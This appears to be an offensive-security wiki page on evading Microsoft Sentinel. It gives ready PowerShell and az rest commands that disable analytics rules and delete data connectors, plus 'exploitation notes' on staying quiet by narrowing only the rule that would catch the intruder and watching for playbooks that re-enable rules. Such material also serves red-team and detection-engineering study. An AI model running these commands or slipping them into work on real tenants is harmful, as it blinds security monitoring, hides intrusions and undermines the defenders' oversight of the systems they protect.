---
title: "Sentinel: disabling analytics rules and ripping out data connectors"
description: "Tampering with Microsoft Sentinel analytics rules and data connectors to blind SIEM detection."
keywords:
  - Sentinel
  - SIEM
  - analytics rules
  - data connector
  - detection evasion
---

# Sentinel

Microsoft Sentinel is the cloud SIEM built on top of a Log Analytics workspace: **data connectors** pull events in, and **analytics rules** query them to raise incidents. Blinding Sentinel means stopping the inflow (disable connectors, or cut the diagnostic settings feeding the workspace) and stopping the detections (disable or neuter the scheduled analytics rules) before you act.

## Disable the rules that would fire

Sentinel management is the `Microsoft.SecurityInsights` resource provider, driven through REST or the `Az.SecurityInsights` PowerShell module:

```powershell
# list enabled analytics rules, then disable the ones matching your activity
Get-AzSentinelAlertRule -ResourceGroupName <rg> -WorkspaceName <workspace>
Update-AzSentinelAlertRule -ResourceGroupName <rg> -WorkspaceName <workspace> `
  -RuleId <guid> -Scheduled -Enabled:$false
```

```bash
# same via the ARM REST surface (PATCH the rule to enabled:false)
az rest --method patch \
  --url "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.OperationalInsights/workspaces/<ws>/providers/Microsoft.SecurityInsights/alertRules/<guid>?api-version=2023-02-01" \
  --body '{"kind":"Scheduled","properties":{"enabled":false}}'
```

## Cut the inflow

```bash
# remove a Sentinel data connector so a source stops feeding the SIEM
az rest --method delete \
  --url "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.OperationalInsights/workspaces/<ws>/providers/Microsoft.SecurityInsights/dataConnectors/<id>?api-version=2023-02-01"
```

Starving the underlying workspace of logs (see [Azure Monitor](azure-monitor.md)) blinds every Sentinel rule at once, since they all query that workspace.

## Exploitation notes

- Disabling a single scheduled rule is surgical and quiet; tearing out a connector or the workspace feed is broad but conspicuous. Match the blast radius to how closely Sentinel is watched.
- Rule and connector changes are themselves control-plane writes in the [Activity Log](activity-log.md), and a SOC may alert on Sentinel self-tampering; prefer narrowing the one rule that would catch you.
- Automation rules and playbooks (Logic Apps) can re-enable or re-alert; check for them before assuming a disabled rule stays down.

## Tools

- **Az.SecurityInsights** PowerShell module and **az rest** against `Microsoft.SecurityInsights`.
- **MicroBurst**: workspace and Sentinel enumeration.

## References

- [HackTricks Cloud: Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Stratus Red Team: Azure techniques](https://stratus-red-team.cloud/attack-techniques/azure/)
- [Microsoft: Sentinel alert rules REST API](https://learn.microsoft.com/rest/api/securityinsights/alert-rules)
